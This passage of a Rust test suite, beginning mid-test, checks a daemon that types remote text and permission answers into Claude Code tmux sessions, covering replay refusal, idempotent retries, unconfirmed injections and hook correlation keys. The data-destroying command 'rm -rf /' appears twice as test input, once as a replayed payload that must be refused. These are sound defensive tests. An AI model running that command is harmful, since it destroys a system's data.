        let original = pending.payload.to_string().len();
        assert!(original > 4096);

        daemon.truncate_payload(&mut pending);

        assert_eq!(pending.payload["_codeconnect_truncated"], true);
        assert_eq!(
            pending.payload["_original_bytes"].as_u64().unwrap() as usize,
            original,
            "the recorded original size must be the size before the cut"
        );
        let preview = pending.payload["_preview"].as_str().unwrap();
        assert!(preview.len() <= 4096);
        assert!(
            preview.len() > 4096 - 4,
            "the cut must land on the nearest boundary, not far short of it"
        );
        // It survives the round trip an event has to make.
        let encoded = serde_json::to_string(&pending.payload).unwrap();
        let _: serde_json::Value = serde_json::from_str(&encoded).unwrap();
    }

    #[tokio::test]
    async fn a_payload_under_the_cap_is_untouched() {
        let daemon = test_daemon();
        let mut pending = PendingEvent::new(
            &test_key(),
            EventKind::ToolResult,
            json!({"stdout": "ok"}),
            Source::Hook,
        );
        let before = pending.payload.clone();
        daemon.truncate_payload(&mut pending);
        assert_eq!(pending.payload, before);
    }

    // ========================================================== send_text

    #[tokio::test]
    async fn send_text_with_an_identity_types_once_however_often_it_is_retried() {
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
        let text = "reply with exactly: ok";
        let hash = protocol::hash::send_text_hash(uid, text, true);

        let first = daemon
            .send_text(
                uid,
                text.to_string(),
                Some("st-1"),
                Some(&hash),
                true,
                false,
            )
            .await;
        assert!(matches!(first, SendTextResult::Sent { .. }), "{first:?}");

        for _ in 0..4 {
            match daemon
                .send_text(
                    uid,
                    text.to_string(),
                    Some("st-1"),
                    Some(&hash),
                    true,
                    false,
                )
                .await
            {
                SendTextResult::Duplicate { .. } => {}
                other => panic!("a retry must replay, not retype: {other:?}"),
            }
        }
        assert_eq!(
            pane.typed(),
            vec![text.to_string()],
            "a takeover retried five times must reach the TTY once"
        );
    }

    #[tokio::test]
    async fn send_text_refuses_an_identity_that_does_not_match_its_own_text() {
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
        let honest = protocol::hash::send_text_hash(uid, "deploy to prod", true);

        // A hash for different text: a captured frame replayed with new content
        // under an id the ledger already trusts.
        let swapped = daemon
            .send_text(
                uid,
                "rm -rf /".to_string(),
                Some("st-1"),
                Some(&honest),
                true,
                false,
            )
            .await;
        assert!(
            matches!(&swapped, SendTextResult::Refused { reason } if reason.contains("payload_hash")),
            "{swapped:?}"
        );

        // An id with no hash cannot say what it is a retry *of*.
        let unbound = daemon
            .send_text(uid, "hi".to_string(), Some("st-2"), None, true, false)
            .await;
        assert!(
            matches!(unbound, SendTextResult::Refused { .. }),
            "{unbound:?}"
        );

        // The same id later carrying different material is a conflict, not a
        // licence to type something else.
        let ok = protocol::hash::send_text_hash(uid, "one", true);
        assert!(matches!(
            daemon
                .send_text(uid, "one".into(), Some("st-3"), Some(&ok), true, false)
                .await,
            SendTextResult::Sent { .. }
        ));
        let other = protocol::hash::send_text_hash(uid, "two", true);
        let conflict = daemon
            .send_text(uid, "two".into(), Some("st-3"), Some(&other), true, false)
            .await;
        assert!(
            matches!(&conflict, SendTextResult::Refused { reason } if reason.contains("already used")),
            "{conflict:?}"
        );
        assert_eq!(pane.typed(), vec!["one".to_string()]);
    }

    #[tokio::test]
    async fn send_text_is_bounded_and_the_server_picks_the_interlock() {
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;

        let huge = "x".repeat(protocol::ws::MAX_SEND_TEXT_BYTES + 1);
        let refused = daemon.send_text(uid, huge, None, None, true, false).await;
        assert!(
            matches!(&refused, SendTextResult::Refused { reason } if reason.contains("ceiling")),
            "{refused:?}"
        );
        assert!(pane.typed().is_empty());

        // The interlock is the composer, chosen here and not offered by the
        // caller — `Daemon::send_text` has no parameter for it at all, which is
        // the point: the client used to nominate the needle that authorised its
        // own keystrokes.
        assert!(matches!(
            daemon.send_text(uid, "hello".into(), None, None, true, false).await,
            SendTextResult::Sent { matched } if matched == "composer"
        ));

        // And with a permission prompt up, the composer is not ready, so free
        // text is refused rather than typed into the prompt.
        pane.show(&permission_pane("touch /tmp/a"));
        let blocked = daemon
            .send_text(uid, "hello".into(), None, None, true, false)
            .await;
        assert!(
            matches!(blocked, SendTextResult::Refused { .. }),
            "{blocked:?}"
        );
        assert_eq!(pane.typed(), vec!["hello".to_string()]);
    }

    #[tokio::test]
    async fn a_send_text_interrupted_mid_injection_is_never_typed_again() {
        let store = shared_store();
        let uid = TEST_UID;
        let text = "deploy";
        let hash = protocol::hash::send_text_hash(uid, text, true);
        // The claim writer refuses a uid with no session row, so the run this
        // claim belongs to has to exist the way it would in production.
        {
            let now = protocol::time::now_rfc3339();
            store
                .upsert_session(&SessionRow {
                    session_uid: uid.into(),
                    session_id: "cc-1".into(),
                    tmux_session: "cc-1".into(),
                    tmux_socket: protocol::TMUX_SOCKET_NAME.into(),
                    cwd: "/tmp".into(),
                    claude_session_id: None,
                    transcript_path: None,
                    lifecycle: Lifecycle::Live,
                    created_at: now.clone(),
                    updated_at: now,
                })
                .unwrap()
                .assert_present();
        }

        // A claim from a process that did not come back.
        assert_eq!(
            store
                .claim_text_mutation(uid, "st-1", &hash, &protocol::time::now_rfc3339())
                .unwrap(),
            TextClaim::Claimed
        );

        let daemon = daemon_on(Arc::clone(&store), Config::default());
        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
        daemon.recover().await;

        let result = daemon
            .send_text(
                uid,
                text.to_string(),
                Some("st-1"),
                Some(&hash),
                true,
                false,
            )
            .await;
        assert!(
            matches!(result, SendTextResult::Indeterminate { .. }),
            "an interrupted takeover must be reported, not repeated: {result:?}"
        );
        assert!(pane.typed().is_empty());
    }

    #[tokio::test]
    async fn an_injection_the_supervisor_never_confirms_is_not_retried() {
        // The case a two-outcome result type cannot express. The supervisor
        // typed and then stopped answering — a timeout, a lost socket, a
        // machine under load. "Refused" and "we never found out" are the same
        // error to a caller with only success and failure, and treating this
        // one as a refusal releases the claim and lets the next tap type "1"
        // into a prompt that has already been answered.
        let daemon = daemon_with(Config {
            supervisor_timeout_ms: 100,
            ..Config::default()
        });
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert!(wait_bound(&daemon, uid, &request_id).await);
        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));

        pane.go_silent();
        match daemon
            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
            .await
        {
            AnswerResult::Duplicate { outcome, .. } => {
                assert!(
                    outcome.indeterminate,
                    "an unconfirmed injection must be recorded as unknown: {outcome:?}"
                );
            }
            other => panic!("an unconfirmed injection must settle, not vanish: {other:?}"),
        }

        // The card is gone and the ledger is terminal, so a retry replays the
        // unknown rather than being applied to a live TTY a second time.
        assert!(daemon.sessions().await.unwrap()[0].blocked_on.is_empty());
        match daemon
            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
            .await
        {
            AnswerResult::Duplicate { outcome, .. } => assert!(outcome.indeterminate),
            other => panic!("a retry must not re-inject: {other:?}"),
        }
        assert!(
            daemon
                .store
                .answer_claim(uid, &request_id)
                .unwrap()
                .is_none(),
            "the claim is settled, not left dangling"
        );
    }

    #[tokio::test]
    async fn a_request_that_is_never_answered_leaves_nothing_in_the_inflight_map() {
        // The leak: the in-flight map was pruned only by an arriving *response*.
        // Every timed-out request therefore left a `oneshot::Sender` behind
        // permanently, on a map that lives as long as the supervisor's session
        // — an unbounded growth on the stall path, which is the path that fires
        // exactly when the daemon is already struggling. Nothing anywhere would
        // ever have collected them.
        let daemon = daemon_with(Config {
            supervisor_timeout_ms: 50,
            ..Config::default()
        });
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        assert_eq!(pane.inflight_len(), 0);

        pane.go_silent();
        for _ in 0..5 {
            let _ = daemon
                .send_text("cc-1", "hello".into(), None, None, false, false)
                .await;
        }
        assert_eq!(
            pane.inflight_len(),
            0,
            "five abandoned requests left {} entries behind",
            pane.inflight_len()
        );
    }

    #[tokio::test]
    async fn a_supervisor_that_stopped_reading_is_reported_as_not_sent() {
        // The write queue is bounded now, so a supervisor whose process is
        // stopped fills it. That must read as `NotSent` — the frame never left
        // this process, so nothing can have been typed and a retry is safe —
        // and it must not block the caller waiting for room.
        let daemon = daemon_with(Config {
            supervisor_timeout_ms: 50,
            ..Config::default()
        });
        let uid = TEST_UID;
        // Registered with a receiver that is dropped immediately: a closed
        // channel is the strongest form of "not reading", and both refusals
        // (full and closed) take the same branch.
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let _registration = daemon
            .register_supervisor(
                RegisterSession {
                    session_id: "cc-1".into(),
                    session_uid: Some(uid.into()),
                    tmux_session: "cc-1".into(),
                    tmux_socket: protocol::TMUX_SOCKET_NAME.into(),
                    cwd: "/tmp".into(),
                    supervisor_pid: 4242,
                    claude_bin: None,
                    started_at: protocol::time::now_rfc3339(),
                    protocol_minor: protocol::PROTOCOL_MINOR,
                },
                tx,
                Arc::new(std::sync::Mutex::new(HashMap::new())),
            )
            .await
            .unwrap();

        let started = std::time::Instant::now();
        let result = daemon.capture("cc-1", 40).await;
        assert!(result.is_err(), "a capture nobody can receive must fail");
        assert!(
            started.elapsed() < Duration::from_millis(500),
            "it must fail fast rather than wait on a queue that will never drain"
        );
    }

    #[tokio::test]
    async fn a_send_text_the_supervisor_never_confirms_stays_claimed() {
        let daemon = daemon_with(Config {
            supervisor_timeout_ms: 100,
            ..Config::default()
        });
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
        let text = "deploy";
        let hash = protocol::hash::send_text_hash(uid, text, true);

        pane.go_silent();
        let first = daemon
            .send_text(
                uid,
                text.to_string(),
                Some("st-1"),
                Some(&hash),
                true,
                false,
            )
            .await;
        assert!(
            matches!(first, SendTextResult::Indeterminate { .. }),
            "an unconfirmed takeover is unknown, not refused: {first:?}"
        );

        // Answering again — even with the supervisor healthy — must replay the
        // unknown, because the first attempt may already have typed it.
        let second = daemon
            .send_text(
                uid,
                text.to_string(),
                Some("st-1"),
                Some(&hash),
                true,
                false,
            )
            .await;
        assert!(
            matches!(second, SendTextResult::Indeterminate { .. }),
            "{second:?}"
        );
    }

    #[tokio::test]
    async fn a_request_that_never_reached_a_supervisor_is_a_refusal_not_an_unknown() {
        // The precision that makes the previous test safe rather than merely
        // cautious. "No supervisor attached" means the request never left this
        // process, so nothing can have been typed — reporting *that* as unknown
        // would strand a perfectly answerable card behind a permanent "we do
        // not know", and a daemon that says it does not know when it does is
        // the same defect as one that claims to know when it does not.
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, &permission_pane("touch /tmp/a"), "").await;
        let request_id = raise_prompt(&daemon, uid, "p1", "touch /tmp/a").await;
        assert!(wait_bound(&daemon, uid, &request_id).await);
        let hash =
            protocol::hash::approval_payload_hash("Bash", &json!({"command": "touch /tmp/a"}));

        // The supervisor goes away entirely — the tab was closed, the session
        // ended, ccd has nothing to talk to.
        daemon.unregister_supervisor(&pane._registration).await;

        match daemon
            .answer(&request_id, &hash, AnswerDecision::Allow, Some(uid))
            .await
        {
            AnswerResult::Rejected { reason } => {
                assert!(reason.contains("no supervisor"), "{reason}");
            }
            other => panic!("nothing was typed, so this is a refusal: {other:?}"),
        }
        assert!(
            daemon
                .store
                .answer_claim(uid, &request_id)
                .unwrap()
                .is_none(),
            "a refusal must release the claim so the card stays answerable"
        );
        assert!(daemon.store.get_answer(uid, &request_id).unwrap().is_none());
        assert!(pane.typed().is_empty());
    }

    #[tokio::test]
    async fn a_send_text_that_never_reached_a_supervisor_can_be_retried() {
        let daemon = test_daemon();
        let uid = TEST_UID;
        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
        let text = "deploy";
        let hash = protocol::hash::send_text_hash(uid, text, true);
        daemon.unregister_supervisor(&pane._registration).await;

        let refused = daemon
            .send_text(
                uid,
                text.to_string(),
                Some("st-1"),
                Some(&hash),
                true,
                false,
            )
            .await;
        assert!(
            matches!(&refused, SendTextResult::Refused { reason } if reason.contains("no supervisor")),
            "{refused:?}"
        );

        // The claim was released, so the same identity works once a supervisor
        // is back rather than being stuck as a permanent unknown.
        let pane = attach(&daemon, "cc-1", uid, COMPOSER_PANE, "").await;
        assert!(matches!(
            daemon
                .send_text(
                    uid,
                    text.to_string(),
                    Some("st-1"),
                    Some(&hash),
                    true,
                    false
                )
                .await,
            SendTextResult::Sent { .. }
        ));
        assert_eq!(pane.typed(), vec![text.to_string()]);
    }

    #[test]
    fn constant_time_eq_behaves_like_eq() {
        assert!(constant_time_eq(b"abc", b"abc"));
        assert!(!constant_time_eq(b"abc", b"abd"));
        assert!(!constant_time_eq(b"abc", b"ab"));
        assert!(constant_time_eq(b"", b""));
    }

    #[test]
    fn correlation_key_is_stable_for_the_same_call() {
        let pre = input_from(
            r#"{"hook_event_name":"PreToolUse","prompt_id":"p1","tool_name":"Bash",
                "tool_input":{"command":"touch /tmp/a"},"tool_use_id":"toolu_1"}"#,
        );
        let perm = input_from(
            r#"{"hook_event_name":"PermissionRequest","prompt_id":"p1","tool_name":"Bash",
                "tool_input":{"command":"touch /tmp/a"}}"#,
        );
        assert_eq!(
            correlation_key("cc-1", &pre),
            correlation_key("cc-1", &perm),
            "PermissionRequest must join to its PreToolUse"
        );
    }

    #[test]
    fn correlation_key_separates_different_commands() {
        let a = input_from(
            r#"{"prompt_id":"p1","tool_name":"Bash","tool_input":{"command":"touch /tmp/a"}}"#,
        );
        let b = input_from(
            r#"{"prompt_id":"p1","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}"#,
        );
        assert_ne!(correlation_key("cc-1", &a), correlation_key("cc-1", &b));
    }

    #[test]
    fn correlation_key_separates_sessions() {
        let input =
            input_from(r#"{"prompt_id":"p1","tool_name":"Bash","tool_input":{"command":"ls"}}"#);
        assert_ne!(
            correlation_key("cc-1", &input),
            correlation_key("cc-2", &input)
        );
    }

    #[test]
    fn correlation_key_absent_without_tool_details() {
        assert!(correlation_key("cc-1", &input_from(r#"{"prompt_id":"p1"}"#)).is_none());
    }

    #[test]
    fn tool_events_get_distinct_dedup_ids() {
        let input = input_from(
            r#"{"hook_event_name":"PreToolUse","tool_use_id":"toolu_1","tool_name":"Bash"}"#,
        );
        let pre = hook_event(&test_key(), &HookEventName::PreToolUse, &json!({}), &input);
        let post = hook_event(&test_key(), &HookEventName::PostToolUse, &json!({}), &input);
        assert_eq!(pre.source_event_id.as_deref(), Some("pre:toolu_1"));
        assert_eq!(post.source_event_id.as_deref(), Some("post:toolu_1"));
        assert_ne!(pre.source_event_id, post.source_event_id);
    }

    #[test]
    fn notifications_get_no_dedup_id() {
        // Two identical idle notifications are two real facts.
        let input =
            input_from(r#"{"hook_event_name":"Notification","notification_type":"idle_prompt"}"#);
        let event = hook_event(
            &test_key(),
            &HookEventName::Notification,
            &json!({}),
            &input,
        );
        assert_eq!(event.source_event_id, None);
    }
}
